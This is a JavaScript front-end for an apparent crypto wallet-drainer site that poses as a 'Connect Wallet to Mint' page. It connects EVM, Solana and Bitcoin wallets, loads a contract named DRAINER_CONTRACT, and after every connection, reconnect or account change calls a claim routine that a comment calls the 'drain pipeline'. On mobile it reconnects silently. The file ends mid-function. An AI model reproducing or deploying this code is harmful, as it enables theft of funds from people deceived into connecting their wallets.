import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ============================================================
  //  DEBUG PANEL – double-tap to toggle
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  const logDebug = (msg) => {
    const line = `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    debugArea.innerHTML += line;
    debugArea.scrollTop = debugArea.scrollHeight;
    console.log('[main.js]', msg);
  };

  // ============================================================
  //  DEVICE DETECTION
  // ============================================================
  const UA = navigator.userAgent;
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid = () => /Android/i.test(UA);
  const isDesktop = () => !isMobile();
  const getPlatform = () => isIOS() ? 'ios' : isAndroid() ? 'android' : /Windows/i.test(UA) ? 'windows' : /Macintosh|Mac OS X/i.test(UA) ? 'mac' : 'unknown';

  // ============================================================
  //  CONFIG DESTRUCTURING (fault-tolerant)
  // ============================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI
  } = CONFIG || {};

  if (!PROJECT_ID || !DAPP_METADATA) {
    logDebug('❌ Critical: PROJECT_ID or DAPP_METADATA missing in config.js');
  }

  let activeProjectId = PROJECT_ID;

  // ============================================================
  //  WEBSOCKET PRE-FLIGHT CHECK – quick, non-blocking
  // ============================================================
  async function canReachRelay(timeoutMs = 2000) {
    try {
      const ok = await new Promise((resolve) => {
        const ws = new WebSocket('wss://relay.walletconnect.com');
        const t = setTimeout(() => { try { ws.close(); } catch (_) {} resolve(false); }, timeoutMs);
        ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (_) {} resolve(true); };
        ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (_) {} resolve(false); };
      });
      logDebug(`Relay reachable: ${ok}`);
      return ok;
    } catch (e) {
      logDebug(`Relay check failed: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  PARALLEL LIBRARY LOADER – races CDNs to cut latency
  // ============================================================
  function raceCdn(cdns, label) {
    return new Promise((resolve) => {
      let settled = false;
      cdns.forEach((url) => {
        import(url)
          .then((mod) => {
            if (settled) return;
            settled = true;
            logDebug(`✅ ${label} from ${url.split('/')[2]}`);
            resolve(mod.default || mod);
          })
          .catch(() => { /* silent – others may win */ });
      });
      // Hard cutoff so we don't hang forever
      setTimeout(() => {
        if (!settled) { settled = true; logDebug(`❌ ${label}: all CDNs failed or timed out`); resolve(null); }
      }, 8000);
    });
  }

  async function loadWalletConnect() {
    const [SignClient, WalletConnectModal, EthereumProvider] = await Promise.all([
      raceCdn([
        'https://esm.sh/@walletconnect/sign-client@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
        'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0'
      ], 'SignClient'),
      raceCdn([
        'https://esm.sh/@walletconnect/modal@2.6.2',
        'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
        'https://cdn.skypack.dev/@walletconnect/modal@2.6.2'
      ], 'WalletConnectModal'),
      raceCdn([
        'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
        'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0'
      ], 'EthereumProvider')
    ]);
    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ============================================================
  //  DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // Module-scope state
  let SignClient, WalletConnectModal, EthereumProvider;
  let signClient = null;          // WC SignClient instance (singleton)
  let wcModal    = null;          // WC Modal instance (singleton)
  let ethProvider = null;         // EthereumProvider (WC v2 provider)
  let currentSession = null;
  let isConnecting = false;
  let web3Instance = null;
  let contractInstance = null;

  // ============================================================
  //  UI HELPERS
  // ============================================================
  function setButtonState(button, state) {
    if (!button) return;
    Object.assign(button.style, {
      display: 'inline-block', padding: '14px 28px', borderRadius: '8px',
      fontWeight: '600', border: 'none',
      cursor: state === 'loading' ? 'not-allowed' : 'pointer',
      transition: 'all 0.3s ease', color: 'white', fontSize: '16px',
      fontFamily: "'Inter', sans-serif",
      boxShadow: '0 4px 12px rgba(0,0,0,0.15)', minWidth: '180px'
    });
    button.disabled = state === 'loading';

    const config = {
      loading:    { bg: 'linear-gradient(135deg,#666,#888)',  html: '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...' },
      connected:  { bg: 'linear-gradient(135deg,#10B981,#059669)', html: '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected' },
      disconnect: { bg: 'linear-gradient(135deg,#EF4444,#DC2626)', html: '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect' },
      failed:     { bg: 'linear-gradient(135deg,#EF4444,#DC2626)', html: '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed' },
      normal:     { bg: 'linear-gradient(135deg,#FF6B00,#FF8C00)', html: '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint' }
    };
    const c = config[state] || config.normal;
    button.style.background = c.bg;
    button.innerHTML = c.html;
    if (state === 'failed') setTimeout(() => setButtonState(button, 'normal'), 3000);
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    Object.assign(claimStatus.style, {
      display: 'block', padding: '12px 16px', borderRadius: '8px',
      marginTop: '12px', fontWeight: '500', fontSize: '14px',
      textAlign: 'center', transition: 'all 0.3s ease'
    });
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' }
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => { claimStatus.style.display = 'none'; claimStatus.style.opacity = '1'; }, 300);
      }, 5000);
    }
  }

  // ============================================================
  //  STORAGE HELPERS
  // ============================================================
  const LS = {
    save(address, session, chainType) {
      localStorage.setItem('connectedWallet', address);
      if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) localStorage.setItem('chainType', chainType);
    },
    getWallet()    { return localStorage.getItem('connectedWallet'); },
    getSession()   {
      const s = localStorage.getItem('walletConnectSession');
      return s ? JSON.parse(s) : null;
    },
    getChainType() { return localStorage.getItem('chainType') || 'unknown'; },
    clear() {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
    }
  };

  // ============================================================
  //  CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana?.connect) return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ============================================================
  //  SOLANA WALLET DETECTION
  // ============================================================
  function getSolanaWallets() {
    const list = [];
    if (window.phantom?.solana || window.solana?.isPhantom) list.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
    if (window.solflare)        list.push({ name: 'Solflare', provider: window.solflare });
    if (window.backpack)        list.push({ name: 'Backpack', provider: window.backpack });
    if (window.coinbaseSolana)  list.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (window.trustWallet?.solana) list.push({ name: 'Trust', provider: window.trustWallet.solana });
    return list;
  }

  // ============================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ============================================================
  const evmProviders = [];
  let eip6963Ready = false;

  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    // Fire 3 announce requests, staggered
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 400);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1200);
    // Legacy fallback
    if (window.ethereum && !evmProviders.some((p) => p.provider === window.ethereum)) {
      evmProviders.push({ info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum });
    }
  }

  // ============================================================
  //  GLOBAL STATE BRIDGE – script.js reads window.__apexConnected
  // ============================================================
  function publishGlobalState({ address, chain, provider, session }) {
    window.__apexConnected = {
      address, chain, provider, session,
      web3: web3Instance,
      contract: contractInstance,
      publishedAt: Date.now()
    };
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: window.__apexConnected }));
    logDebug(`📡 Published global state: ${address} (${chain})`);
  }

  // ============================================================
  //  WEB3 + CONTRACT INITIALISATION (unified, one source of truth)
  // ============================================================
  async function ensureWeb3AndContract(provider) {
    if (!provider) return;
    try {
      if (!window.Web3) {
        logDebug('Web3 not on window, loading via CDN...');
        await new Promise((resolve, reject) => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js';
          s.onload = resolve;
          s.onerror = () => reject(new Error('Web3 load failed'));
          document.head.appendChild(s);
        });
      }
      web3Instance = new window.Web3(provider);
      if (DRAINER_CONTRACT && CONTRACT_ABI?.length) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      }
      logDebug('Web3 + contract initialised');
    } catch (e) {
      logDebug(`Web3 init failed: ${e.message}`);
    }
  }

  // ============================================================
  //  UI UPDATE
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const label = labels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `margin-top:12px;padding:10px 16px;font-family:'JetBrains Mono',monospace;font-size:14px;color:#059669;text-align:center;background:linear-gradient(135deg,#ECFDF5,#D1FAE5);border-radius:8px;border:1px solid #A7F3D0;box-shadow:0 2px 8px rgba(5,150,105,0.1);`;
      connectButton?.parentNode?.appendChild(display);
    }
    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;"><i class="far fa-copy"></i></button>
      </div>`;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { btn.innerHTML = orig; }, 2000);
      });
    });
    showStatus(`Connected to ${label}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
  }

  // ============================================================
  //  WALLETCONNECT INIT – SINGLETON, IDEMPOTENT
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (signClient && wcModal) return true;

    activeProjectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;
    logDebug(`Init WC with projectId=${activeProjectId.slice(0, 8)}...`);

    if (!SignClient || !WalletConnectModal) {
      logDebug('❌ WC libraries not loaded');
      return false;
    }

    try {
      signClient = await SignClient.init({
        projectId: activeProjectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com'
      });

      wcModal = new WalletConnectModal({
        projectId: activeProjectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif"
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa'
        ],
        mobileWallets: [
          { id: 'metamask',  name: 'MetaMask',       links: { native: 'metamask://',        universal: 'https://metamask.app.link/' } },
          { id: 'trust',     name: 'Trust Wallet',   links: { native: 'trust://',           universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',   name: 'Rainbow',        links: { native: 'rainbow://',         universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase',  name: 'Coinbase Wallet',links: { native: 'coinbasewallet://',  universal: 'https://go.cb-w.com/' } }
        ]
      });
      logDebug('✅ WC client + modal ready');
      return true;
    } catch (e) {
      logDebug(`❌ WC init failed: ${e.message}`);
      signClient = null;
      wcModal = null;
      return false;
    }
  }

  // ============================================================
  //  WALLETCONNECT CONNECT – OPTIMISED FOR MOBILE FAST PATH
  //  Mobile: 45s budget. Desktop: 90s budget.
  // ============================================================
  async function connectViaWalletConnect(useTestId = false) {
    if (isConnecting) {
      logDebug('Already connecting, ignoring duplicate call');
      return false;
    }
    isConnecting = true;

    try {
      const initOk = await initWalletConnect(useTestId);
      if (!initOk) {
        showStatus('WalletConnect unavailable', 'error');
        return false;
      }

      // Close any lingering modal first
      try { wcModal?.closeModal?.(); } catch (_) {}

      showStatus('Opening wallet selection...', 'info');

      const connectPromise = signClient.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged']
          }
        }
      });

      const { uri, approval } = await connectPromise;

      if (uri) {
        logDebug(`URI generated (len=${uri.length})`);
        try { wcModal.openModal({ uri }); } catch (e) { logDebug(`Modal open failed: ${e.message}`); }

        // Mobile deeplink for iOS – Android handled by modal's "Open" button
        if (isIOS() && DAPP_METADATA.mobileWallets) {
          for (const w of DAPP_METADATA.mobileWallets) {
            if (w.links?.universal) {
              const url = `${w.links.universal}wc?uri=${encodeURIComponent(uri)}`;
              logDebug(`iOS deeplink -> ${w.name}`);
              sessionStorage.setItem('pending_wc_uri', uri);
              sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
              // Delay so the modal renders first
              setTimeout(() => { window.location.href = url; }, 250);
              break;
            }
          }
        }
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
      }

      // Shorter timeout on mobile for fast user feedback
      const timeoutMs = isMobile() ? 45000 : 90000;
      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('Connection timeout')), timeoutMs))
      ]);

      try { wcModal?.closeModal?.(); } catch (_) {}

      if (!session?.namespaces?.eip155?.accounts?.length) {
        showStatus('No accounts returned', 'error');
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      logDebug(`✅ WC session: ${account}`);

      currentSession = session;
      LS.save(account, session, 'evm');
      updateConnectedUI(account, 'evm');

      // Initialize EthereumProvider (the correct pattern)
      try {
        ethProvider = await EthereumProvider.init({
          projectId: activeProjectId,
          chains: [1],
          optionalChains: [1],
          showQrModal: false,
          metadata: DAPP_METADATA
        });
        // If session exists, enable to bind
        if (ethProvider.session) {
          await ethProvider.enable();
        }
      } catch (e) {
        logDebug(`EthereumProvider init warn: ${e.message}`);
      }

      // Prefer the WC provider over injected for signing
      const signingProvider = ethProvider || window.ethereum;
      await ensureWeb3AndContract(signingProvider);

      publishGlobalState({ address: account, chain: 'evm', provider: signingProvider, session });

      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      // Trigger drain pipeline
      setTimeout(() => window.initiateClaimProcess?.(), 800);
      return true;

    } catch (err) {
      logDebug(`WC error: ${err.message}`);
      try { wcModal?.closeModal?.(); } catch (_) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      const msg = err.message || '';
      if (/User rejected|Cancelled/i.test(msg))      showStatus('Connection cancelled', 'error');
      else if (/timeout/i.test(msg))                 showStatus('Timed out – please retry', 'error');
      else                                            showStatus('Wallet connection failed', 'error');
      return false;
    } finally {
      isConnecting = false;
    }
  }

  // ============================================================
  //  DIRECT EVM (DESKTOP PRIMARY)
  //  Shorter per-wallet timeout = faster fallback if wallet is slow.
  // ============================================================
  async function connectDirectEVM(timeoutMs = 20000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 500)); // give EIP-6963 providers a moment

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{ info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
    }
    if (!providers.length) { logDebug('No EVM providers found'); return false; }

    // Auto-select MetaMask if present, else single provider
    let chosen = providers.length === 1 ? providers[0] :
      providers.find((p) => p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name)) || null;

    if (!chosen) {
      // Show simple chooser
      chosen = await new Promise((resolve) => {
        const overlay = document.createElement('div');
        overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:99999;`;
        const box = document.createElement('div');
        box.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:#fff;font-family:'Inter',sans-serif;`;
        box.innerHTML = `<h3 style="margin:0 0 16px;">Select a Wallet</h3><div id="wl" style="display:flex;flex-direction:column;gap:10px;"></div>`;
        overlay.appendChild(box);
        document.body.appendChild(overlay);
        const list = box.querySelector('#wl');
        providers.forEach((p) => {
          const b = document.createElement('button');
          b.textContent = p.info.name;
          b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:#fff;cursor:pointer;text-align:left;font-size:15px;`;
          b.onclick = () => { overlay.remove(); resolve(p); };
          list.appendChild(b);
        });
      });
    }

    const provider = chosen.provider;
    logDebug(`Direct EVM via ${chosen.info.name} (timeout ${timeoutMs}ms)`);

    try {
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
      ]);

      if (accounts?.length) {
        const address = accounts[0];
        logDebug(`✅ Direct EVM: ${address}`);
        LS.save(address, null, 'evm');
        updateConnectedUI(address, 'evm');
        await ensureWeb3AndContract(provider);
        publishGlobalState({ address, chain: 'evm', provider, session: null });
        attachProviderListeners(provider);
        setTimeout(() => window.initiateClaimProcess?.(), 800);
        return true;
      }
    } catch (e) {
      logDebug(`Direct EVM failed: ${e.message}`);
      if (e.code === 4001) logDebug('User rejected');
    }
    return false;
  }

  // ============================================================
  //  BITCOIN (UniSat) – Desktop
  // ============================================================
  async function connectBitcoin() {
    if (!window.unisat) { showStatus('UniSat not installed', 'error'); return false; }
    try {
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts?.length) throw new Error('No BTC account');
      const address = accounts[0];
      LS.save(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      publishGlobalState({ address, chain: 'bitcoin', provider: window.unisat, session: null });

      window.unisat.on?.('accountsChanged', (accs) => {
        if (!accs.length) { resetConnectedUI(); LS.clear(); }
        else { LS.save(accs[0], null, 'bitcoin'); updateConnectedUI(accs[0], 'bitcoin'); }
      });
      setTimeout(() => window.initiateClaimProcess?.(), 800);
      return true;
    } catch (e) {
      logDebug(`BTC error: ${e.message}`);
      showStatus(`Bitcoin failed: ${e.message}`, 'error');
      return false;
    }
  }

  // ============================================================
  //  SOLANA – Desktop
  // ============================================================
  async function connectSolana() {
    const wallets = getSolanaWallets();
    if (!wallets.length) { showStatus('No Solana wallet found', 'error'); return false; }
    try {
      const { provider } = wallets[0];
      let pk;
      if (provider.connect) {
        const r = await provider.connect();
        pk = r.publicKey?.toString() || r.toString();
      } else if (provider.request) {
        const r = await provider.request({ method: 'connect' });
        pk = r.publicKey.toString();
      } else throw new Error('Unsupported provider');

      LS.save(pk, null, 'solana');
      updateConnectedUI(pk, 'solana');
      window.solanaProvider = provider;
      window.solanaPublicKey = pk;
      publishGlobalState({ address: pk, chain: 'solana', provider, session: null });
      setTimeout(() => window.initiateClaimProcess?.(), 800);
      return true;
    } catch (e) {
      logDebug(`SOL error: ${e.message}`);
      showStatus(`Solana failed: ${e.message}`, 'error');
      return false;
    }
  }

  // ============================================================
  //  EVM LISTENERS – centralised
  // ============================================================
  function attachProviderListeners(provider) {
    if (!provider?.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (!accounts.length) { resetConnectedUI(); LS.clear(); }
      else {
        updateConnectedUI(accounts[0], 'evm');
        LS.save(accounts[0], currentSession, 'evm');
        publishGlobalState({ address: accounts[0], chain: 'evm', provider, session: currentSession });
        setTimeout(() => window.initiateClaimProcess?.(), 800);
      }
    });
    provider.on('chainChanged', (id) => showStatus(`Network changed to ${parseInt(id)}`, 'info'));
    provider.on('disconnect', () => { logDebug('Provider disconnected'); });
  }

  // ============================================================
  //  MAIN DISPATCHER
  //  MOBILE:   WC-only, fast 45s budget
  //  DESKTOP:  Direct EVM (20s) → WC (90s) → Solana → Bitcoin
  // ============================================================
  async function connectWallet() {
    if (isConnecting) { logDebug('Connection in progress'); return; }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Detecting wallet...', 'info');

    const platform = getPlatform();
    logDebug(`Platform: ${platform} | mobile=${isMobile()}`);

    let success = false;

    if (isMobile()) {
      // ---- FAST MOBILE PATH: WC ONLY ----
      logDebug('📱 Mobile: WC only');
      success = await connectViaWalletConnect(false);
      if (!success) {
        logDebug('Mobile: retry with test project ID');
        success = await connectViaWalletConnect(true);
      }
      if (!success) {
        showStatus('No wallet found. Install a WalletConnect wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      }
      return;
    }

    // ---- DESKTOP PATH ----
    logDebug('🖥️ Desktop: Direct EVM first');

    // 1. Direct EVM – 20s cap
    success = await connectDirectEVM(20000);
    if (success) return;

    // 2. WalletConnect fallback
    logDebug('Desktop: WC fallback');
    success = await connectViaWalletConnect(false);
    if (!success) success = await connectViaWalletConnect(true);
    if (success) return;

    // 3. Solana
    if (getSolanaWallets().length) {
      success = await connectSolana();
      if (success) return;
    }

    // 4. Bitcoin
    if (window.unisat) {
      success = await connectBitcoin();
      if (success) return;
    }

    logDebug('❌ Desktop: all methods failed');
    showStatus('No supported wallet found', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  async function disconnectWallet() {
    try {
      await window.solanaProvider?.disconnect?.();
      if (signClient && currentSession) {
        await signClient.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
      }
      await ethProvider?.disconnect?.();
    } catch (e) {
      logDebug(`Disconnect warn: ${e.message}`);
    }
    currentSession = null;
    ethProvider = null;
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    window.__apexConnected = null;
    resetConnectedUI();
    LS.clear();
    web3Instance = null;
    contractInstance = null;
  }

  // ============================================================
  //  CLICK HANDLER
  // ============================================================
  async function handleClick() {
    if (LS.getWallet() && (currentSession || LS.getChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  }
  connectButton?.addEventListener('click', handleClick);
  walletButton?.addEventListener('click', handleClick);

  // ============================================================
  //  SESSION RESTORE – on load
  //  MOBILE: auto-reconnect if saved WC session exists (fast path)
  //  DESKTOP: try saved sessions in order
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet  = LS.getWallet();
    const savedChain   = LS.getChainType();
    const savedSession = LS.getSession();

    // Handle return from mobile wallet deeplink
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTs  = sessionStorage.getItem('pending_wc_timestamp');
    if (pendingUri && pendingTs && Date.now() - parseInt(pendingTs) < 120000 && signClient) {
      logDebug('Handling return from mobile wallet');
      try {
        await new Promise((r) => setTimeout(r, 1500));
        const sessions = signClient.session.values();
        if (sessions.length) {
          const s = sessions[0];
          const account = s.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account) {
            currentSession = s;
            LS.save(account, s, 'evm');
            updateConnectedUI(account, 'evm');
            try {
              ethProvider = await EthereumProvider.init({
                projectId: activeProjectId, chains: [1], showQrModal: false, metadata: DAPP_METADATA
              });
              if (ethProvider.session) await ethProvider.enable();
            } catch (_) {}
            await ensureWeb3AndContract(ethProvider || window.ethereum);
            publishGlobalState({ address: account, chain: 'evm', provider: ethProvider || window.ethereum, session: s });
            sessionStorage.removeItem('pending_wc_uri');
            sessionStorage.removeItem('pending_wc_timestamp');
            setTimeout(() => window.initiateClaimProcess?.(), 800);
            return;
          }
        }
      } catch (e) {
        logDebug(`Return restore failed: ${e.message}`);
      }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
    }

    if (!savedWallet || savedChain === 'unknown') return;
    logDebug(`♻️ Restore ${savedChain}: ${savedWallet}`);

    if (savedChain === 'evm') {
      // Try WC session first
      if (savedSession && signClient) {
        try {
          const s = signClient.session.get(savedSession.topic);
          if (s) {
            currentSession = s;
            updateConnectedUI(savedWallet, 'evm');
            try {
              ethProvider = await EthereumProvider.init({
                projectId: activeProjectId, chains: [1], showQrModal: false, metadata: DAPP_METADATA
              });
              if (ethProvider.session) await ethProvider.enable();
            } catch (_) {}
            await ensureWeb3AndContract(ethProvider || window.ethereum);
            publishGlobalState({ address: savedWallet, chain: 'evm', provider: ethProvider || window.ethereum, session: s });
            return;
          }
        } catch (e) { logDebug(`WC restore warn: ${e.message}`); }
      }
      // Direct injected (desktop)
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            updateConnectedUI(savedWallet, 'evm');
            await ensureWeb3AndContract(window.ethereum);
            publishGlobalState({ address: savedWallet, chain: 'evm', provider: window.ethereum, session: null });
            attachProviderListeners(window.ethereum);
            return;
          }
        } catch (_) {}
      }
      // On mobile with no live session, try a fresh WC connect (silently)
      if (isMobile()) {
        logDebug('Mobile: no live session – attempting auto-reconnect');
        const ok = await connectViaWalletConnect(false);
        if (!ok) LS.clear();
      } else {
        LS.clear();
      }
    } else if (savedChain === 'solana') {
      if (isDesktop() && window.solana?.publicKey?.toString() === savedWallet) {
        updateConnectedUI(savedWallet, 'solana');
        window.solanaProvider = window.solana;
        window.solanaPublicKey = savedWallet;
        publishGlobalState({ address: savedWallet, chain: 'solana', provider: window.solana, session: null });
        return;
      }
      if (isDesktop()) { const ok = await connectSolana(); if (ok) return; }
      LS.clear();
    } else if (savedChain === 'bitcoin') {
      if (isDesktop() && window.unisat) {
        try {
          const accs = await window.unisat.getAccounts();
          if (accs?.length && accs[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'bitcoin');
            publishGlobalState({ address: savedWallet, chain: 'bitcoin', provider: window.unisat, session: null });
            return;
          }
        } catch (_) {}
      }
      LS.clear();
    }
  }

  // ============================================================
  //  BOOTSTRAP
  // ============================================================
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  try {
    // Load libraries in parallel (faster)
    const t0 = performance.now();
    const libs = await loadWalletConnect();
    SignClient = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider = libs.EthereumProvider;
    logDebug(`Libraries loaded in ${Math.round(performance.now() - t0)}ms`);

    if (!SignClient || !WalletConnectModal || !EthereumProvider) {
      throw new Error('One or more WC libraries failed to load');
    }

    setupEIP6963();

    // Non-blocking relay check
    canReachRelay(2000).then((ok) => logDebug(`Relay pre-flight: ${ok ? 'OK' : 'unreachable'}`));

    // Restore any saved session
    await restoreWalletConnection();

    // Wire WC event listeners (idempotent)
    setTimeout(() => {
      if (!signClient) return;
      signClient.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const account = accounts[0].split(':')[2];
          updateConnectedUI(account, 'evm');
          LS.save(account, currentSession, 'evm');
          publishGlobalState({ address: account, chain: 'evm', provider: ethProvider || window.ethereum, session: currentSession });
        }
      });
      signClient.on('session_delete', () => {
        logDebug('WC session deleted');
        resetConnectedUI();
        LS.clear();
        currentSession = null;
      });
      signClient.on('session_connect', (s) => {
        const account = s.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          currentSession = s;
